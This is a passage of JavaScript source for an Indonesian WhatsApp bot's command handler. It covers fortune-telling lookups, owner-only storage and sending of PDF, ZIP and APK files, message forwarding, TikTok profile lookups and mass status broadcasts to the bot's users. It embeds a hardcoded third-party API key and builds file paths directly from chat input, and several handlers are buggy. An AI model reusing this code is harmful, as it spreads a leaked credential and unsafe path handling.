 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Analisa :* ${anu.message.analisa}\n⨠ *Angka Akar :* ${anu.message.angka_akar}\n⨠ *Sifat :* ${anu.message.sifat}\n⨠ *Elemen :* ${anu.message.elemen}\n⨠ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break

case 'potensipenyakit2443417': case 'penyakit2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Analisa :* ${anu.message.analisa}\n⨠ *Sektor :* ${anu.message.sektor}\n⨠ *Elemen :* ${anu.message.elemen}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'artitarot2443417': case 'tarot2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendImage(from, anu.message.image, `⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⨠ *Arti :* ${anu.message.arti}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'fengshui2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} Lenwy, 1, 2007\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Lahir :* ${anu.message.tahun_lahir}\n⨠ *Gender :* ${anu.message.jenis_kelamin}\n⨠ *Angka Kua :* ${anu.message.angka_kua}\n⨠ *Kelompok :* ${anu.message.kelompok}\n⨠ *Karakter :* ${anu.message.karakter}\n⨠ *Sektor Baik :* ${anu.message.sektor_baik}\n⨠ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break

case 'haribaik2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⨠ *Info :* ${anu.message.info}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'harisangar2443417': case 'taliwangke2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Hasil :* ${anu.message.result}\n⨠ *Info :* ${anu.message.info}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'harinaas2443417': case 'harisial2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Hari Lahir :* ${anu.message.hari_lahir}\n⨠ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⨠ *Hari Naas :* ${anu.message.hari_naas}\n⨠ *Info :* ${anu.message.catatan}\n⨠ *Catatan :* ${anu.message.info}`, m)
}
break

case 'nagahari2443417': case 'harinaga2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Hari Lahir :* ${anu.message.hari_lahir}\n⨠ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⨠ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'arahrejeki2443417': case 'arahrezeki2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Hari Lahir :* ${anu.message.hari_lahir}\n⨠ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⨠ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'peruntungan2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} len, 5, 8, 2007, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⨠ *Hasil :* ${anu.message.result}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'weton2443417': case 'wetonjawa2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 5, 8, 2007`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Tanggal :* ${anu.message.tanggal}\n⨠ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⨠ *Watak Hari :* ${anu.message.watak_hari}\n⨠ *Naga Hari :* ${anu.message.naga_hari}\n⨠ *Jam Baik :* ${anu.message.jam_baik}\n⨠ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break

case 'sifat2443417': case 'karakter2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} len, 5, 8, 2007`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break

case 'keberuntungan2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} len, 5, 8, 2007`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Nama :* ${anu.message.nama}\n⨠ *Lahir :* ${anu.message.tgl_lahir}\n⨠ *Hasil :* ${anu.message.result}`, m)
}
break

case 'memancing2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Tanggal :* ${anu.message.tgl_memancing}\n⨠ *Hasil :* ${anu.message.result}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'masasubur2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Hasil :* ${anu.message.result}\n⨠ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'shio2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply(anu.message)
 lenwy.sendText(from, `⨠ *Hasil :* ${anu.message}`, m)
}
break

case 'setcmd': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) reply `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break

case 'delcmd': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) reply `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break

case 'listcmd': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
let teks = `list cmd`
lenwy.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break

case 'addpdf':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await lenwy.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break

case 'delpdf':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break

case 'listpdf': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⨠ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Kamiya + sambil reply pesan target* \n\n Contoh 2 : yopdf Kamiya`
reply(teksoooo)
}
break

case 'yopdf':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let teks = `${text}`
{
lenwy.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendpdf': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
lenwy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break

case 'addzip':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await lenwy.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break

case 'delzip':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break

case 'listzip': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⨠ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Kamiya + sambil reply pesan target* \n\n Contoh 2 : yozip Kamiya`
reply(teksooooo)
}
break

case 'yozip':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
lenwy.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendzip': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
lenwy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break

case 'addapk':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await lenwy.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break

case 'delapk':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break

case 'listapk': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⨠ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Kamiya + sambil reply pesan target* \n\n Contoh 2 : yoapk Kamiya`
reply(teksoooooo)
}
break

case 'yoapk':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
lenwy.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendapk': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
lenwy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break

case 'addvn':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await lenwy.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'delvn':{
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break

case 'listvn':{
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 let teksooo = '⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `⨠ ${x}\n`
}
reply(teksooo)
}
break

case 'addmsg': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) reply `Contoh : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) reply `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break

case 'sendlist': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) reply `'${text}' tidak terdaftar di list pesan`
 lenwy.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break

case 'listmsg': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}
break

case 'addlist':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isCreator) return reply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            reply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isCreator) return reply(mess.botAdmin)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            reply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break

case 'delmsg': case 'deletemsg': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break

case 'getmsg': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
 if (!text) reply `Contoh : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) reply `'${text}' tidak terdaftar di list pesan`
 lenwy.copyNForward(from, msgs[text.toLowerCase()], true)
}
break

case 'google': {
if (!q) return reply(`❄️️ *Contoh : ${prefix + command} Project Kamiya汉 V3*`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `❄️️ *Google Search From : ${text}*\n\n`
for (let g of res) {
teks += `⨠ *Title* : ${g.title}\n`
teks += `⨠ *Description* : ${g.snippet}\n`
teks += `⨠ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break

case 'jarak':{
if (!text) return reply(`❄️️ *Contoh: ${prefix + command} Jakarta|Bandung*`)
reply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
    if (!(from && to)) return reply (`❄️️ *Contoh: ${prefix + command} Jakarta|Bandung*`) 
    let data = await jarak(from, to)
    if (data.img) return lenwy.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
    else reply(data.desc)
}
break

case 'couple': {
LenwyLD()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
lenwy.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
lenwy.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break

case 'getname': {
LenwyLD()
if (qtod === "true") {
namenye = await lenwy.getName(m.quoted.sender)
reply(namenye)
} else if (qtod === "false") {
lenwy.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break

case 'getpic': {
LenwyLD()
if (qtod === "true") {
try {
pporg = await lenwy.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
lenwy.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await lenwy.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
lenwy.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break



case "setppbot": {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await lenwy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await lenwy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses`)
} else {
var memeg = await lenwy.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
        break

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!/image/.test(mime)) reply `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) reply `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await lenwy.downloadAndSaveMediaMessage(m)
await lenwy.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply('done')
}
break

case 'block': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'stalktiktok':
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
if (args.length == 0) return reply(`Contoh: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=haikalgans`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
lenwy.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break

case 'listpnl':
case 'listpanel':
if (isBan) return reply('*Kamu Di Ban Owner*')
reply('❄️️ *Halo Ini List Harga Panelnya Ya*\n\n🎁 *Ram 1Gb - CPU 30% : 2K/Bulan*\n🎁 *Ram 2Gb - CPU 50% : 5K/Bulan*\n🎁 *Ram 3Gb - CPU 80% : 8K/Bulan*\n🎁 *Ram 4Gb - CPU 100% : 10K/Bulan*\n🎁 *Ram 5Gb - CPU 120% : 13K/Bulan*\n💎 *Ram 1Gb - CPU UNLI : 15K/Bulan*\n\n❄️️ *Mau Beli? Bisa Chat :*\n ⨠ *wa.me/6283829102407*\n ⨠ *wa.me/48459231563*')
break

case 'afk': {
if (isBan) return reply('*Kamu Di Ban Owner*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`❄️️ *${pushname} Melakukan AFK*\n❄️️ *Alasan* ${text ? ': ' + text : ''}`)
}
break

case 'buatsw':{
if (!isCreator) return reply('*Khusus Premium*')
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = lenwy.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = lenwy.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
await LenwyLD ()
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case "buatswimage":{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
 if (!quoted) reply `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) reply `Balas image dengan caption *${prefix + command}*`
const media = await lenwy.downloadAndSaveMediaMessage(quoted)
lenwy.sendMessage('status@broadcast', { image: { url: media }, caption: `${text}` }, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case "buatswvideo":{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
 if (!quoted) reply `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) reply `Balas video dengan caption *${prefix + command}*`
const media = await lenwy.downloadAndSaveMediaMessage(quoted)
lenwy.sendMessage('status@broadcast', { video: { url: media }, caption: `${text}` }, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'swin':{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
if (!text) return reply(`masukin text nya`)
lenwy.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'vnsw':{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
lenwy.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'inisw':{
